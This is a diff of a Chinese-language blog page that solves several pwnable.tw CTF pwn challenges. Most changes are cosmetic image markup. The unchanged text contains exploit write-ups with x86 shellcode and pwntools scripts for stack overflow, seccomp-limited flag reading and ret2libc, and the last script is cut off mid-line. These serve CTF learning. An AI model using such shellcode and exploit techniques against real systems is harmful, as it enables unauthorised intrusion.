@@ -188,7 +188,7 @@
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                 <i class="icon icon-lg icon-chevron-left"></i>
             </a>
-            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                 <i class="icon icon-lg icon-search"></i>
             </a>
@@ -258,25 +258,61 @@
 <p>Just a start.<br>nc chall.pwnable.tw 10000</p>
 </blockquote>
 <h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><p>file检查一下，32位，动态链接</p>
-<div style="width: 80%; margin: auto"><img src="/2019/09/13/Pwn-tw-刷题记录/start0.jpg" alt="start0"></div>
+<div style="width: 80%; margin: auto"><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/13/Pwn-tw-刷题记录/start0.jpg" alt="start0" title="">
+                </div>
+                <div class="image-caption">start0</div>
+            </figure></div>
 
 <p>checksec一下，没有任何保护</p>
-<div style="width: 80%; margin: auto"><img src="/2019/09/13/Pwn-tw-刷题记录/start2.jpg" alt="start2"></div>
+<div style="width: 80%; margin: auto"><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/13/Pwn-tw-刷题记录/start2.jpg" alt="start2" title="">
+                </div>
+                <div class="image-caption">start2</div>
+            </figure></div>
 
 <p>ida打开如下：</p>
-<div style="width: 80%; margin: auto"><img src="/2019/09/13/Pwn-tw-刷题记录/start1.jpg" alt="start1"></div>
+<div style="width: 80%; margin: auto"><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/13/Pwn-tw-刷题记录/start1.jpg" alt="start1" title="">
+                </div>
+                <div class="image-caption">start1</div>
+            </figure></div>
 
 <h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>F5出来之后的东西有点奇怪，所以直接看汇编<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">public _start</span><br><span class="line">_start proc near</span><br><span class="line">push    esp</span><br><span class="line">push    offset _exit</span><br><span class="line">xor     eax, eax</span><br><span class="line">xor     ebx, ebx</span><br><span class="line">xor     ecx, ecx</span><br><span class="line">xor     edx, edx</span><br><span class="line">push    3A465443h</span><br><span class="line">push    20656874h</span><br><span class="line">push    20747261h</span><br><span class="line">push    74732073h</span><br><span class="line">push    2774654Ch</span><br><span class="line">mov     ecx, esp        ; addr</span><br><span class="line">mov     dl, 14h         ; len</span><br><span class="line">mov     bl, 1           ; fd</span><br><span class="line">mov     al, 4</span><br><span class="line">int     80h             ; LINUX - sys_write</span><br><span class="line">xor     ebx, ebx</span><br><span class="line">mov     dl, 3Ch</span><br><span class="line">mov     al, 3</span><br><span class="line">int     80h             ; LINUX -</span><br><span class="line">add     esp, 14h</span><br><span class="line">retn</span><br><span class="line">_start endp ; sp-analysis failed</span><br></pre></td></tr></table></figure></p>
 <p>程序逻辑大概就是首先将需要的参数传入寄存器，然后执行系统调用，根据<a href="http://syscalls.kernelgrok.com/" target="_blank" rel="noopener">这里</a>的查找，可以确定第一个系统调用为sys_write</p>
-<div style="width: 80%; margin: auto"><img src="/2019/09/13/Pwn-tw-刷题记录/start3.jpg" alt="start3"></div>
+<div style="width: 80%; margin: auto"><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/13/Pwn-tw-刷题记录/start3.jpg" alt="start3" title="">
+                </div>
+                <div class="image-caption">start3</div>
+            </figure></div>
 
 <p>其中eax为系统调用参数，0x4便是sys_write。ebx为fd，这里是1。ecx为buf，这里为esp。edx为size，这里为0x14</p>
 <p>这里就是将<code>Let&#39;s start the CTF:</code>这句话压入栈，然后通过sys_write打印到bash中</p>
 <p>之后程序又将ebx置零，然后将edx改为0x3c，eax改为0x3。这里也就是代表捕获bash中的输入并且覆盖到esp上面去</p>
-<div style="width: 80%; margin: auto"><img src="/2019/09/13/Pwn-tw-刷题记录/start4.jpg" alt="start4"></div>
+<div style="width: 80%; margin: auto"><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/13/Pwn-tw-刷题记录/start4.jpg" alt="start4" title="">
+                </div>
+                <div class="image-caption">start4</div>
+            </figure></div>
 
 <p>经过gdb调试，我发现也的确是这样的</p>
-<div style="width: 80%; margin: auto"><img src="/2019/09/13/Pwn-tw-刷题记录/start5.jpg" alt="start5"></div>
+<div style="width: 80%; margin: auto"><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/13/Pwn-tw-刷题记录/start5.jpg" alt="start5" title="">
+                </div>
+                <div class="image-caption">start5</div>
+            </figure></div>
 
 <p>其中<code>0xffffcdc8</code>处也就是返回地址</p>
 <p>那么这便是简单的栈溢出，由于没有开启nx，我们可以将shellcode写入栈上，然后控制返回地址到shellcode即可，其中偏移为20</p>
@@ -291,31 +327,79 @@
 <p>Read the flag from /home/orw/flag.<br>Only open read write syscall are allowed to use.<br>nc chall.pwnable.tw 10001</p>
 </blockquote>
 <h2 id="基本信息-1"><a href="#基本信息-1" class="headerlink" title="基本信息"></a>基本信息</h2><p>file检查一下，32位，动态链接</p>
-<div style="width: 80%; margin: auto"><img src="/2019/09/13/Pwn-tw-刷题记录/orw0.jpg" alt="orw0"></div>
+<div style="width: 80%; margin: auto"><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/13/Pwn-tw-刷题记录/orw0.jpg" alt="orw0" title="">
+                </div>
+                <div class="image-caption">orw0</div>
+            </figure></div>
 
 <p>checksec一下，开启了Canary和Part relro</p>
-<div style="width: 80%; margin: auto"><img src="/2019/09/13/Pwn-tw-刷题记录/orw1.jpg" alt="orw1"></div>
+<div style="width: 80%; margin: auto"><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/13/Pwn-tw-刷题记录/orw1.jpg" alt="orw1" title="">
+                </div>
+                <div class="image-caption">orw1</div>
+            </figure></div>
 
 <p>ida打开如下：</p>
-<div style="width: 80%; margin: auto"><img src="/2019/09/13/Pwn-tw-刷题记录/orw2.jpg" alt="orw2"></div>
+<div style="width: 80%; margin: auto"><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/13/Pwn-tw-刷题记录/orw2.jpg" alt="orw2" title="">
+                </div>
+                <div class="image-caption">orw2</div>
+            </figure></div>
 
 <h2 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h2><p>正如题目表述的那样，我们只能使用<code>open/read/write</code>三个syscall，限制他们的也正是<code>orw_seccomp</code>函数</p>
-<div style="width: 80%; margin: auto"><img src="/2019/09/13/Pwn-tw-刷题记录/orw3.jpg" alt="orw3"></div>
+<div style="width: 80%; margin: auto"><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/13/Pwn-tw-刷题记录/orw3.jpg" alt="orw3" title="">
+                </div>
+                <div class="image-caption">orw3</div>
+            </figure></div>
 
 <p>那么思路也很清楚，open打开flag文件，read读取文件，write打印文件内容</p>
 <p>首先我们看open函数，eax为0x5；ebx为文件名；ecx为flags，也就是open的第二个参数；edx为mode；在执行了open之后，fd便存储在eax</p>
-<div style="width: 80%; margin: auto"><img src="/2019/09/13/Pwn-tw-刷题记录/orw4.jpg" alt="orw4"></div>
+<div style="width: 80%; margin: auto"><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/13/Pwn-tw-刷题记录/orw4.jpg" alt="orw4" title="">
+                </div>
+                <div class="image-caption">orw4</div>
+            </figure></div>
 
 <p>那么我们可以这样编写shellcode<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># fd = open(&apos;/home/orw/flag&apos;,0)</span><br><span class="line">mov ecx,0</span><br><span class="line">mov eax,SYS_open</span><br><span class="line">call here</span><br><span class="line">.string &quot;/home/orw/flag&quot;</span><br><span class="line">.byte 0</span><br><span class="line">here:</span><br><span class="line">pop ebx</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure></p>
 <p>然后我们看read函数，eax为0x3；ebx为fd，也就是open之后的eax；ecx为buf；edx为count，也就是size</p>
-<div style="width: 80%; margin: auto"><img src="/2019/09/13/Pwn-tw-刷题记录/orw5.jpg" alt="orw5"></div>
+<div style="width: 80%; margin: auto"><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/13/Pwn-tw-刷题记录/orw5.jpg" alt="orw5" title="">
+                </div>
+                <div class="image-caption">orw5</div>
+            </figure></div>
 
 <p>vmmap看一下，bss段可读可写可执行，我们可以把文件内容写入bss段</p>
-<div style="width: 80%; margin: auto"><img src="/2019/09/13/Pwn-tw-刷题记录/orw6.jpg" alt="orw6"></div>
+<div style="width: 80%; margin: auto"><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/13/Pwn-tw-刷题记录/orw6.jpg" alt="orw6" title="">
+                </div>
+                <div class="image-caption">orw6</div>
+            </figure></div>
 
 <p>那么我们可以这样编写shellcode<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># read(fd,bss+0x40,0x40)</span><br><span class="line">mov ebx,eax</span><br><span class="line">mov eax,SYS_read</span><br><span class="line">mov ecx,0x0804A100</span><br><span class="line">mov edx,0x40</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure></p>
 <p>最后我们看write函数，eax为0x4，ebx为fd，输出到屏幕就是1；ecx为buf；edx为vien，也就是size</p>
-<div style="width: 80%; margin: auto"><img src="/2019/09/13/Pwn-tw-刷题记录/orw7.jpg" alt="orw7"></div>
+<div style="width: 80%; margin: auto"><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/13/Pwn-tw-刷题记录/orw7.jpg" alt="orw7" title="">
+                </div>
+                <div class="image-caption">orw7</div>
+            </figure></div>
 
 <p>那么我们可以这样编写shellcode<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#write(1,bss+0x40,0x40)</span><br><span class="line">mov ebx,0x1</span><br><span class="line">mov eax,SYS_write</span><br><span class="line">mov ecx,0x0804A100</span><br><span class="line">mov edx,0x40</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure></p>
 <h2 id="解题脚本-1"><a href="#解题脚本-1" class="headerlink" title="解题脚本"></a>解题脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># r = process('./orw')</span></span><br><span class="line">r = remote(<span class="string">'chall.pwnable.tw'</span>, <span class="number">10001</span>)</span><br><span class="line">sd = <span class="keyword">lambda</span> x : r.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x : r.sendline(x)</span><br><span class="line">rv = <span class="keyword">lambda</span> x = <span class="number">2048</span> : r.recv(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x : r.recvuntil(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> : r.recvline()</span><br><span class="line">ia = <span class="keyword">lambda</span> : r.interactive()</span><br><span class="line">ra = <span class="keyword">lambda</span> : r.recvall()</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y: r.sendlineafter(x,y)</span><br><span class="line">sa = <span class="keyword">lambda</span> x,y : r.sendafter(x,y)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">'shellcode:'</span>)</span><br><span class="line">code = <span class="string">'''</span></span><br><span class="line"><span class="string">        mov ecx,0</span></span><br><span class="line"><span class="string">        mov eax,SYS_open</span></span><br><span class="line"><span class="string">        call here</span></span><br><span class="line"><span class="string">        .string "/home/orw/flag"</span></span><br><span class="line"><span class="string">        .byte 0</span></span><br><span class="line"><span class="string">        here:</span></span><br><span class="line"><span class="string">        pop ebx</span></span><br><span class="line"><span class="string">        int 0x80</span></span><br><span class="line"><span class="string">        mov ebx,eax</span></span><br><span class="line"><span class="string">        mov eax,SYS_read</span></span><br><span class="line"><span class="string">        mov ecx,0x0804A100</span></span><br><span class="line"><span class="string">        mov edx,0x40</span></span><br><span class="line"><span class="string">        int 0x80</span></span><br><span class="line"><span class="string">        mov ebx,0x1</span></span><br><span class="line"><span class="string">        mov eax,SYS_write</span></span><br><span class="line"><span class="string">        mov ecx,0x0804A100</span></span><br><span class="line"><span class="string">        mov edx,0x40</span></span><br><span class="line"><span class="string">        int 0x80</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line"></span><br><span class="line">shellcode=asm(code,arch=<span class="string">"i386"</span>)</span><br><span class="line">sd(shellcode)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>
@@ -323,25 +407,79 @@
 <p>Have you ever use Microsoft calculator?<br>nc chall.pwnable.tw 10100</p>
 </blockquote>
 <h2 id="基本信息-2"><a href="#基本信息-2" class="headerlink" title="基本信息"></a>基本信息</h2><p>file检查一下，32位，静态链接</p>
-<div style="width: 80%; margin: auto"><img src="/2019/09/13/Pwn-tw-刷题记录/calc0.jpg" alt="calc0"></div>
+<div style="width: 80%; margin: auto"><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/13/Pwn-tw-刷题记录/calc0.jpg" alt="calc0" title="">
+                </div>
+                <div class="image-caption">calc0</div>
+            </figure></div>
 
 <p>checksec一下，开启了Canary，NX和Part relro</p>
-<div style="width: 80%; margin: auto"><img src="/2019/09/13/Pwn-tw-刷题记录/calc1.jpg" alt="calc1"></div>
+<div style="width: 80%; margin: auto"><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/13/Pwn-tw-刷题记录/calc1.jpg" alt="calc1" title="">
+                </div>
+                <div class="image-caption">calc1</div>
+            </figure></div>
 
 <p>ida打开如下：</p>
-<div style="width: 80%; margin: auto"><img src="/2019/09/13/Pwn-tw-刷题记录/calc2.jpg" alt="calc2"></div>
+<div style="width: 80%; margin: auto"><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/13/Pwn-tw-刷题记录/calc2.jpg" alt="calc2" title="">
+                </div>
+                <div class="image-caption">calc2</div>
+            </figure></div>
 
-<div style="width: 80%; margin: auto"><img src="/2019/09/13/Pwn-tw-刷题记录/calc3.jpg" alt="calc3"></div>
+<div style="width: 80%; margin: auto"><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/13/Pwn-tw-刷题记录/calc3.jpg" alt="calc3" title="">
+                </div>
+                <div class="image-caption">calc3</div>
+            </figure></div>
 
-<div style="width: 80%; margin: auto"><img src="/2019/09/13/Pwn-tw-刷题记录/calc4.jpg" alt="calc4"></div>
+<div style="width: 80%; margin: auto"><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/13/Pwn-tw-刷题记录/calc4.jpg" alt="calc4" title="">
+                </div>
+                <div class="image-caption">calc4</div>
+            </figure></div>
 
-<div style="width: 80%; margin: auto"><img src="/2019/09/13/Pwn-tw-刷题记录/calc5.jpg" alt="calc5"></div>
+<div style="width: 80%; margin: auto"><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/13/Pwn-tw-刷题记录/calc5.jpg" alt="calc5" title="">
+                </div>
+                <div class="image-caption">calc5</div>
+            </figure></div>
 
-<div style="width: 80%; margin: auto"><img src="/2019/09/13/Pwn-tw-刷题记录/calc6.jpg" alt="calc6"></div>
+<div style="width: 80%; margin: auto"><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/13/Pwn-tw-刷题记录/calc6.jpg" alt="calc6" title="">
+                </div>
+                <div class="image-caption">calc6</div>
+            </figure></div>
 
-<div style="width: 80%; margin: auto"><img src="/2019/09/13/Pwn-tw-刷题记录/calc7.jpg" alt="calc7"></div>
+<div style="width: 80%; margin: auto"><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/13/Pwn-tw-刷题记录/calc7.jpg" alt="calc7" title="">
+                </div>
+                <div class="image-caption">calc7</div>
+            </figure></div>
 
-<div style="width: 80%; margin: auto"><img src="/2019/09/13/Pwn-tw-刷题记录/calc8.jpg" alt="calc8"></div>
+<div style="width: 80%; margin: auto"><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/13/Pwn-tw-刷题记录/calc8.jpg" alt="calc8" title="">
+                </div>
+                <div class="image-caption">calc8</div>
+            </figure></div>
 
 <h2 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h2><p>首先在get_expr中，限制了我们的输入为<code>+-*/%0-9</code>，get_expr会逐个读入字符并在最后添加一个<code>\x00</code></p>
 <p>然后init_pool中会初始化长度为100的数组，全部赋值为0</p>
@@ -374,13 +512,31 @@
 <p>3 x 17 = ?<br>nc chall.pwnable.tw 10105</p>
 </blockquote>
 <h2 id="基本信息-3"><a href="#基本信息-3" class="headerlink" title="基本信息"></a>基本信息</h2><p>file检查一下，64位，动态链接</p>
-<div style="width: 80%; margin: auto"><img src="/2019/09/13/Pwn-tw-刷题记录/3x170.jpg" alt="3x170"></div>
+<div style="width: 80%; margin: auto"><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/13/Pwn-tw-刷题记录/3x170.jpg" alt="3x170" title="">
+                </div>
+                <div class="image-caption">3x170</div>
+            </figure></div>
 
 <p>checksec一下，开启了NX和Part relro，并且ida打开发现是有Canary的</p>
-<div style="width: 80%; margin: auto"><img src="/2019/09/13/Pwn-tw-刷题记录/3x171.jpg" alt="3x171"></div>
+<div style="width: 80%; margin: auto"><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/13/Pwn-tw-刷题记录/3x171.jpg" alt="3x171" title="">
+                </div>
+                <div class="image-caption">3x171</div>
+            </figure></div>
 
 <p>ida打开如下：</p>
-<div style="width: 80%; margin: auto"><img src="/2019/09/13/Pwn-tw-刷题记录/3x172.jpg" alt="3x172"></div>
+<div style="width: 80%; margin: auto"><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/13/Pwn-tw-刷题记录/3x172.jpg" alt="3x172" title="">
+                </div>
+                <div class="image-caption">3x172</div>
+            </figure></div>
 
 <h2 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h2><blockquote>
 <p>本思路摘抄于<a href="https://xuanxuanblingbling.github.io/ctf/pwn/2019/09/06/317/" target="_blank" rel="noopener">该博客</a></p>
@@ -404,7 +560,13 @@
 <blockquote>
 <p>.init<br>.init_array<br>.fini<br>.fini_array</p>
 </blockquote>
-<div style="width: 80%; margin: auto"><img src="/2019/09/13/Pwn-tw-刷题记录/3x173.jpg" alt="3x173"></div>
+<div style="width: 80%; margin: auto"><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/13/Pwn-tw-刷题记录/3x173.jpg" alt="3x173" title="">
+                </div>
+                <div class="image-caption">3x173</div>
+            </figure></div>
 
 <p>其中<code>.init和.fini</code>点进去是函数，<code>.init_array和.fini_array</code>点进去是数组</p>
 <p>而且我们有:</p>
@@ -442,13 +604,31 @@
 <p>Sort the memory!<br>nc chall.pwnable.tw 10101</p>
 </blockquote>
 <h2 id="基本信息-4"><a href="#基本信息-4" class="headerlink" title="基本信息"></a>基本信息</h2><p>file检查一下，32位，动态链接</p>
-<div style="width: 80%; margin: auto"><img src="/2019/09/13/Pwn-tw-刷题记录/dubblesort0.jpg" alt="dubblesort0"></div>
+<div style="width: 80%; margin: auto"><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/13/Pwn-tw-刷题记录/dubblesort0.jpg" alt="dubblesort0" title="">
+                </div>
+                <div class="image-caption">dubblesort0</div>
+            </figure></div>
 
 <p>checksec一下，保护全开</p>
-<div style="width: 80%; margin: auto"><img src="/2019/09/13/Pwn-tw-刷题记录/dubblesort1.jpg" alt="dubblesort1"></div>
+<div style="width: 80%; margin: auto"><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/13/Pwn-tw-刷题记录/dubblesort1.jpg" alt="dubblesort1" title="">
+                </div>
+                <div class="image-caption">dubblesort1</div>
+            </figure></div>
 
 <p>ida打开如下：</p>
-<div style="width: 80%; margin: auto"><img src="/2019/09/13/Pwn-tw-刷题记录/dubblesort2.jpg" alt="dubblesort2"></div>
+<div style="width: 80%; margin: auto"><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/13/Pwn-tw-刷题记录/dubblesort2.jpg" alt="dubblesort2" title="">
+                </div>
+                <div class="image-caption">dubblesort2</div>
+            </figure></div>
 
 <h2 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路"></a>解题思路</h2><p>题目输入名字处如果输入回车则会泄露处canary（需要注意的是接收字节的时候需要把最后的0a改为00）</p>
 <p>并且由于输入的排序的数字的个数没有限制，因此我们也就可以改栈上的数据</p>
@@ -456,32 +636,86 @@
 <p>如果我们输入的数字为<code>+/-</code>，则栈上的数据不会改变</p>
 <p>由于我们有libc，则我们可以用ret2libc来getshell</p>
 <p>我们发现，在name后24个字节处有一个疑似libc中的地址<code>0xf7f9800a</code></p>
-<div style="width: 80%; margin: auto"><img src="/2019/09/13/Pwn-tw-刷题记录/dubblesort3.jpg" alt="dubblesort3"></div>
+<div style="width: 80%; margin: auto"><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/13/Pwn-tw-刷题记录/dubblesort3.jpg" alt="dubblesort3" title="">
+                </div>
+                <div class="image-caption">dubblesort3</div>
+            </figure></div>
 
 <p>之后vmmap查看libc的起始地址，发现为<code>0xf7dc0000</code></p>
-<div style="width: 80%; margin: auto"><img src="/2019/09/13/Pwn-tw-刷题记录/dubblesort4.jpg" alt="dubblesort4"></div>
+<div style="width: 80%; margin: auto"><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/13/Pwn-tw-刷题记录/dubblesort4.jpg" alt="dubblesort4" title="">
+                </div>
+                <div class="image-caption">dubblesort4</div>
+            </figure></div>
 
 <p>那么偏移就为<code>0xf7f9800a-0xf7dc0000=0x1d8000</code>，我们用readelf查看本地的libc也可以发现是这个偏移</p>
-<div style="width: 80%; margin: auto"><img src="/2019/09/13/Pwn-tw-刷题记录/dubblesort5.jpg" alt="dubblesort5"></div>
+<div style="width: 80%; margin: auto"><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/13/Pwn-tw-刷题记录/dubblesort5.jpg" alt="dubblesort5" title="">
+                </div>
+                <div class="image-caption">dubblesort5</div>
+            </figure></div>
 
 <p>由于题目给了libc，我们查看之后发现偏移不太一样，偏移为<code>0x1b0000</code>，之后我们利用的时候要小心</p>
-<div style="width: 80%; margin: auto"><img src="/2019/09/13/Pwn-tw-刷题记录/dubblesort6.jpg" alt="dubblesort6"></div>
+<div style="width: 80%; margin: auto"><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2019/09/13/Pwn-tw-刷题记录/dubblesort6.jpg" alt="dubblesort6" title="">
+                </div>
+                <div class="image-caption">dubblesort6</div>
+            </figure></div>
 
 <h2 id="解题脚本-4"><a href="#解题脚本-4" class="headerlink" title="解题脚本"></a>解题脚本</h2><p>有时候会失败应该是canary比sys_addr大导致的，多试试就行了<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">HOST = <span class="string">"chall.pwnable.tw"</span></span><br><span class="line">PORT = <span class="number">10101</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># r = process('./dubblesort')</span></span><br><span class="line">r = remote(HOST,PORT)</span><br><span class="line">libc = ELF(<span class="string">'libc_32.so.6'</span>)</span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> x : r.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x : r.sendline(x)</span><br><span class="line">rv = <span class="keyword">lambda</span> x = <span class="number">2048</span> : r.recv(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x : r.recvuntil(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> : r.recvline()</span><br><span class="line">ia = <span class="keyword">lambda</span> : r.interactive()</span><br><span class="line">ra = <span class="keyword">lambda</span> : r.recvall()</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y: r.sendlineafter(x,y)</span><br><span class="line">sa = <span class="keyword">lambda</span> x,y : r.sendafter(x,y)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x18</span></span><br><span class="line"></span><br><span class="line">libc_offset = <span class="number">0x1b0000</span></span><br><span class="line">local_offset = <span class="number">0x1d8000</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(value)</span>:</span></span><br><span class="line">	ru(<span class="string">'number :'</span>)</span><br><span class="line">	sl(value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Get libc_base</span></span><br><span class="line">ru(<span class="string">'name :'</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">24</span></span><br><span class="line">sl(payload)</span><br><span class="line">ru(<span class="string">'Hello '</span>)</span><br><span class="line">ru(payload)</span><br><span class="line">libc_base = (u32(rv(<span 